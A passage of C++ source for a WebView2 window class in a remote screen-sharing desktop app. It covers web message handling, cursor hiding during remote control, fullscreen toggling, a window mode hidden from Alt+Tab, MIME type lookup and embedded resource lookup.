            SendToWeb("remote-screen-info", info.dump());
        }
        else if (type == "set-cursor-hidden") {
            bool hidden = msg.value("hidden", true);
            m_inputInjector.SetCursorHidden(hidden);
        }
        else if (type == "cursor-hide-start") {
            // 观看端（控制端）启动光标隐藏强制执行（远控开始时调用）
            m_inputInjector.StartCursorHideEnforcement();
        }
        else if (type == "cursor-hide-stop") {
            // 观看端（控制端）停止光标隐藏并恢复系统光标（远控结束时调用）
            m_inputInjector.StopCursorHideEnforcement();
        }

        // ── perf-* 日志迁移消息 ──
        else if (type.rfind("perf-", 0) == 0) {
            HWND hwnd = m_hwnd;
            std::thread([this, msg, hwnd]() {
                CoInitializeEx(nullptr, COINIT_MULTITHREADED);
                m_migrationMgr.HandleMessage(
                    msg.value("type", ""),
                    msg,
                    [this](const std::string& respType, const std::string& respData) {
                        PostToWeb(respType, respData);
                    }
                );
                CoUninitialize();
            }).detach();
        }

    }
    catch (const std::exception& ex) {
        json err;
        err["error"] = ex.what();
        SendToWeb("debug", err.dump());
    }
}

// ── SendToWeb / PostToWeb ────────────────────────────

void WebViewWindow::SendToWeb(const std::string& type, const std::string& dataJson)
{
    if (!m_webReady || !m_webview) return;
    std::string message = MakeMessage(type,
        dataJson == "null" ? json(nullptr) : json::parse(dataJson, nullptr, false));
    std::wstring wmsg = Utf8ToWide(message);
    m_webview->PostWebMessageAsString(wmsg.c_str());
}

void WebViewWindow::PostToWeb(const std::string& type, const std::string& dataJson)
{
    // 线程安全：通过 PostMessage 派发到 UI 线程
    auto* p = new std::pair<std::string, std::string>(type, dataJson);
    PostMessageW(m_hwnd, WM_POST_TO_WEB, 0, reinterpret_cast<LPARAM>(p));
}

void WebViewWindow::SendRawJsonToWeb(const std::string& jsonMessage)
{
    if (!m_webReady || !m_webview) return;
    std::wstring wmsg = Utf8ToWide(jsonMessage);
    m_webview->PostWebMessageAsString(wmsg.c_str());
}

// ── ResizeWebView ────────────────────────────────────

void WebViewWindow::ResizeWebView()
{
    if (!m_controller) return;
    RECT bounds;
    GetClientRect(m_hwnd, &bounds);
    m_controller->put_Bounds(bounds);
}

// ── 全屏 ──────────────────────────────────────────────

void WebViewWindow::EnterFullscreen()
{
    if (m_isFullscreen) return;
    GetWindowPlacement(m_hwnd, &m_prevPlacement);
    m_prevStyle   = GetWindowLongW(m_hwnd, GWL_STYLE);
    m_prevExStyle = GetWindowLongW(m_hwnd, GWL_EXSTYLE);
    SetWindowLongW(m_hwnd, GWL_STYLE,
        m_prevStyle & ~(WS_CAPTION | WS_THICKFRAME));
    SetWindowLongW(m_hwnd, GWL_EXSTYLE,
        m_prevExStyle & ~(WS_EX_DLGMODALFRAME | WS_EX_WINDOWEDGE |
                          WS_EX_CLIENTEDGE    | WS_EX_STATICEDGE));
    MONITORINFO mi{};
    mi.cbSize = sizeof(mi);
    GetMonitorInfoW(MonitorFromWindow(m_hwnd, MONITOR_DEFAULTTONEAREST), &mi);
    SetWindowPos(m_hwnd, HWND_TOPMOST,
        mi.rcMonitor.left, mi.rcMonitor.top,
        mi.rcMonitor.right  - mi.rcMonitor.left,
        mi.rcMonitor.bottom - mi.rcMonitor.top,
        SWP_NOZORDER | SWP_NOACTIVATE | SWP_FRAMECHANGED);
    m_isFullscreen = true;
    json data; data["fullscreen"] = true;
    SendToWeb("fullscreen-changed", data.dump());
}

void WebViewWindow::ExitFullscreen()
{
    if (!m_isFullscreen) return;
    SetWindowLongW(m_hwnd, GWL_STYLE,   m_prevStyle);
    SetWindowLongW(m_hwnd, GWL_EXSTYLE, m_prevExStyle);
    SetWindowPlacement(m_hwnd, &m_prevPlacement);
    SetWindowPos(m_hwnd, nullptr, 0, 0, 0, 0,
        SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER |
        SWP_NOOWNERZORDER | SWP_FRAMECHANGED);
    // 退出全屏后恢复隐身模式（fullscreen 保存的 exStyle 可能不含 TOOLWINDOW）
    if (m_isStealth) SetStealth(true);
    m_isFullscreen = false;
    json data; data["fullscreen"] = false;
    SendToWeb("fullscreen-changed", data.dump());
}

// ── 隐身模式 (Alt+Tab 不可见) ─────────────────────────

void WebViewWindow::SetStealth(bool enable)
{
    LONG exStyle = GetWindowLongW(m_hwnd, GWL_EXSTYLE);
    if (enable) {
        exStyle |= WS_EX_TOOLWINDOW;
        exStyle &= ~WS_EX_APPWINDOW;
    } else {
        exStyle &= ~WS_EX_TOOLWINDOW;
        exStyle |= WS_EX_APPWINDOW;
    }
    SetWindowLongW(m_hwnd, GWL_EXSTYLE, exStyle);
    SetWindowPos(m_hwnd, nullptr, 0, 0, 0, 0,
        SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    m_isStealth = enable;
}

// ── MIME 类型 ─────────────────────────────────────────

std::string WebViewWindow::GetMimeType(const std::string& path)
{
    auto ext = fs::path(path).extension().string();
    for (auto& c : ext) c = (char)tolower((unsigned char)c);
    if (ext == ".html") return "text/html; charset=utf-8";
    if (ext == ".js")   return "application/javascript; charset=utf-8";
    if (ext == ".css")  return "text/css; charset=utf-8";
    if (ext == ".png")  return "image/png";
    if (ext == ".jpg" || ext == ".jpeg") return "image/jpeg";
    if (ext == ".svg")  return "image/svg+xml";
    if (ext == ".ico")  return "image/x-icon";
    if (ext == ".json") return "application/json";
    return "application/octet-stream";
}

// ── 嵌入资源查找 ─────────────────────────────────────

std::pair<const unsigned char*, size_t>
WebViewWindow::FindEmbeddedResource(const std::string& path)
{
    for (const auto& res : g_web_resources) {
        if (res.path == path) return { res.data, res.size };
    }
    return { nullptr, 0 };
}

} // namespace MDShare
